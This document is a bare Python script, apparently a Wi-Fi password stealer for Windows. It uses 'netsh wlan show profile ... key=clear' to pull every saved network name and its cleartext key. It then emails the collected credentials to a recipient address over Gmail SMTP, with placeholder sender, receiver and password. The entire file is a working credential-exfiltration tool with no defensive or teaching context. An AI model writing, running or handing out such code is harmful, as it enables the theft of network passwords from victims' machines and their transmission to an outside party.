import subprocess

sp = subprocess.Popen('netsh wlan show profile', shell=True, stdout=subprocess.PIPE)
data=sp.stdout.read()
data=str(data)

msgdict={}

while True:
    ups=data.find("All User Profile")
    if ups==-1:
        break
    upns=data.find(":",ups)
    upne=data.find("\\r",ups)
    fn=data[upns+2:upne]
    
    st='netsh wlan show profile name="'+fn+'" key=clear'
    sp2 = subprocess.Popen(st,shell=True,stdout=subprocess.PIPE)
    data2=sp2.stdout.read()
    data2=str(data2)

    s=data2.find("Key Content")
    if s != -1:
        
        ps=data2.find(": ",s)
        pe=data2.find("\\r",ps)
        msgdict[fn]=data2[ps+2:pe]

    else:
        msgdict[fn]='<Open WIFI>'
    data=data[ups+10:]

message=''
for i in msgdict:
    message=message+'\n'+i+':-'+msgdict[i]

import smtplib

sm='sender_mail@addhere.com'
rm='reciever_mail@adhere.com'
pswd='Sender Mail Password'

server=smtplib.SMTP("smtp.gmail.com",587)
server.starttls()
server.login(sm,pswd)
server.sendmail(sm,rm,message)

